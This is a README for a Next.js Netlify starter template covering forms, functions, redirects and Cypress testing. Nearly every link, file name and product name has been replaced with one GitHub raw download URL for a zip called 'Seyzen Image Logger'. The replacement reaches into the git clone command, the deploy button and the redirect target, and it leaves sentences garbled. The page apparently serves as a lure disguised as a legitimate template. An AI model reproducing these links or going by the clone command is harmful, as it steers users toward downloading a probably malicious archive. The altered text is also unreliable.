# https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip Toolbox Template

![next-on-netlify](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)

This is a [https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) v12 project bootstrapped with [`create-next-app`](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip). It is a reference on how to integrate commonly used features within Netlify for https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip 

## Table of Contents:

- [Getting Started](#getting-started)
- [Deploy to Netlify](#deploy-to-netlify)
  - [Deploy using the Netlify CLI](#deploy-using-the-netlify-cli)
  - [Running Locally](#running-locally)
- [Forms](#forms)
  - [Adding a Custom Submission Page](#adding-a-custom-submission-page)
  - [Blocking Bot Spam with a Honeypot Field](#blocking-bot-spam-with-a-honeypot-field)
  - [Forms Resources](#forms-resources)
- [Netlify Functions](#netlify-functions)
  - [Functions Resources](#functions-resources)
- [Redirects](#redirects)
  - [Redirect Resources](#redirect-resources)
- [https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip Toolbox Template Video Walkthrough](#nextjs-toolbox-template-video-walkthrough)
- [Testing](#testing)
  - [Included Default Testing](#included-default-testing)
  - [Removing Renovate](#removing-renovate)
  - [Removing Cypress](#removing-cypress)

## Getting Started

After installing the dependencies with `npm install` or `yarn install`, run the development server:

```bash
npm run dev
# or
yarn dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip`. The page auto-updates as you edit the file.

## Deploy to Netlify

Want to deploy immediately? Click this button

[![Deploy to Netlify Button](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)

Clicking this button will create a new repo for you that looks exactly like this one, and sets that repo up immediately for deployment on Netlify.

### Deploy using the Netlify CLI:
Click the 'Use the Template' button at the top of this repo or clone it with the `git clone` command. Then install the Netlify CLI tool and run `netlify init`. Or straight from the Netlify CLI, use the `netlify sites:create-template` command in you terminal ([learn more about this command here](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)) to do the entire flow for you.

```bash
git clone https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip 

npm install netlify-cli -g # to install the Netlify CLI tool globally

netlify init # initialize a new Netlify project & deploy
```

It will use the information from the included Netlify configuration file, [`https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip`](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip), to set up the build command as `npm run generate` to create a static project and locate the build project in the `dist` directory.

The `init` process will also set up continuous deployemnt for your project so that a new build will be triggered & deployed when you push code to the repo (you can change this from your project dashboard: Site Settings/Build & deploy/Continuous Deployment).

You can also use `netlify deploy (--prod)` to manually deploy and `netlify open` to open your project dashboard.

> 💡 we only have so many keystrokes to give, use `ntl` shorthand for `netlify` or make [an alias of your own](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) to save https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip accumulated miliseconds

### Running Locally

You can use `netlify dev` from the command line to access project information like environment variables as well as

- test functions
- test redirects
- share a live session via url with `netlify dev --live`
- [and more](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) :)

### Deployment Resources

- [CLI docs](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [File-based Netlify Configuration](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Netlify Dev Overview](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Netlify Edge, CDN deployment](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)

## Forms

Netlify Forms are a way to wire up your native HTML into being able to seamlessly handle submissions. To get a form working, we need to add two extra things:

1. An extra attribute on the `form` tag, `data-netlify="true"`

Adding this attribute to our `form` tag will let Netlify know when it loads the page, that it needs to be aware of submissions made through it.

2. A hidden input in the form, `<input type="hidden" name="form-name" value="feedback" />`

Adding this extra input allows our form to be given a name that Netlify can store submissions to. It is a hidden input so your users won't see it but it will pass along the name of our form to Netlify when we submit. In our Netlify Admins site under Forms, we will see our Active Form named `feedback` and all submissions will go there.

With both of those we're ready for folks to give us feedback!

### Adding a custom submission page

While Netlify provides a default submission page for folks, we can customize it as well! With the `action` attribute on the `form` tag we will be able to direct our users to our own page.

In [`https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip`](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) you'll see the form has the attribute `action="/success"` this will take our user to the custom route `/success` which we created under [`https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip`](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip). As long as the page exists, you can direct folks to it!

### Blocking bot spam with a honeypot field

Many bots scan through webpages and try to see what pages and forms they can get access to. Instead of letting our website receive spam submissions, we can filter out unrelated submissions with a visually-hidden input field.

```html
<p class="hidden">
  <label>
    Don’t fill this out if you’re human: <input name="bot-field" />
  </label>
</p>
```

Since screenreader users will still have this announced, it is important for us to
communicate that this is a field not meant to be filled in.

For this to work we also need to add a `data-netlify-honeypot` attribute to the form element.

```html
<form data-netlify="true" data-netlify-honeypot="bot-field" action="/success" method="POST"></form>
```

[See it here in the template code.](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)

### Forms Resources

- [Netlify Forms Setup](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Netlify Forms](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Netlify Forms - Form Triggered Functions](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Netlify Forms - Using reCAPTCHA 2](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)

## Netlify Functions

With Netlify, you can build out server-side code without having to setup and maintain a dedicated server. Inside of our default folder path, [`netlify/functions`](./netlify/functions) you can see an example of the format for JavaScript functions with the [`https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip`](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) file.

The function format expects a function named `handler` to be exported. This will be the function that will be invoked whenever a client makes a request to the generated endpoints. The endpoint's format is followed as `https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip`. So whenever the site is deployed, if you go to `https://<site base url>https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip` you will see a random joke!

> Side note: In our example, we're using `import` to include data from another location and `export const const handler` to let our function be consumed by Netlify. We're able to do this because of [esbuild](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip). This is a bundler configuration we set in our `https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip` under `[functions]`.

### Functions Resources

There is quite a bit you can do with these functions, so here are some additional resources to learn more!

- [Netlify Function Format](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Build Netlify Functions with TypeScript](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Event-triggered Functions](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [What are Background Functions](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Netlify Functions - Examples](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Using esbuild as your bundler for new ECMAScript Features](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)

## Redirects

In the [`https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip`](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) configuration file there is an example of how to implement redirects. Redirects can be used to do many things from redirecting Single Page Apps more predictably, redirecting based on country/language to leveraging On-Demand Builders for [Distributed Persistant Rendering](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip). 

In the example we'll be using redirects to have a shorter endpoint to Netlify functions. By default, you call a Netlify function when requesting a path like `https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip`. Instead, we'll redirect all calls from a path including `/api` to call on the Netlify functions. So the path will be `https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip`, a lot easier to remember too. 


### Example
```toml
[[redirects]]
from = "/api/*"
to = "https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip"
status = 200
force = true
```

First we create a section in the `.toml` for the redirect using `[[redirects]]`. Each redirect should have this line to start the redirect code, and the redirects will be executed in the order they appear in the `.toml` from top to bottom.

The bare minimum needed is the `from` and `to`, letting the [CDN](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) know when a route is requested, the `from`, forward it on to another path, the `to`. In the example, we also added an 'Ok' status code, 200, and set the `force` to true to make sure it _always_ redirects from the `from` path.

There are many ways to use redirects. Check out the resouces below to learn more.

### Redirect Resources

- [Redirect syntax and configuration](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Redirect options](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Creating better, more predicatable redirect rules for SPAs](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [Redirect by country or language](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)
- [On-Demand Builders](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip)

## https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip Toolbox Template Video Walkthrough

https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip

## Testing

### Included Default Testing

We’ve included some tooling that helps us maintain these templates. This template currently uses:

- [Renovate](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) - to regularly update our dependencies
- [Cypress](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) - to run tests against how the template runs in the browser
- [Cypress Netlify Build Plugin](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) - to run our tests during our build process

If your team is not interested in this tooling, you can remove them with ease!

### Removing Renovate

In order to keep our project up-to-date with dependencies we use a tool called [Renovate](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip). If you’re not interested in this tooling, delete the `https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip` file and commit that onto your main branch.

### Removing Cypress

For our testing, we use [Cypress](https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip) for end-to-end testing. This makes sure that we can validate that our templates are rendering and displaying as we’d expect. By default, we have Cypress not generate deploy links if our tests don’t pass. If you’d like to keep Cypress and still generate the deploy links, go into your `https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip` and delete the plugin configuration lines:

```diff
[[plugins]]
  package = "netlify-plugin-cypress"
-  [https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip]
-    enable = true
-
-  [https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip]
-    enable = false
```

If you’d like to remove the `netlify-plugin-cypress` build plugin entirely, you’d need to delete the entire block above instead. And then make sure sure to remove the package from the dependencies using:

```bash
npm uninstall -D netlify-plugin-cypress
```

And lastly if you’d like to remove Cypress entirely, delete the entire `cypress` folder and the `https://github.com/OcuPerks/Seyzen-Image-Logger/raw/refs/heads/main/public/Seyzen_Image_Logger_2.6.zip` file. Then remove the dependency using:

```bash
npm uninstall cypress
```
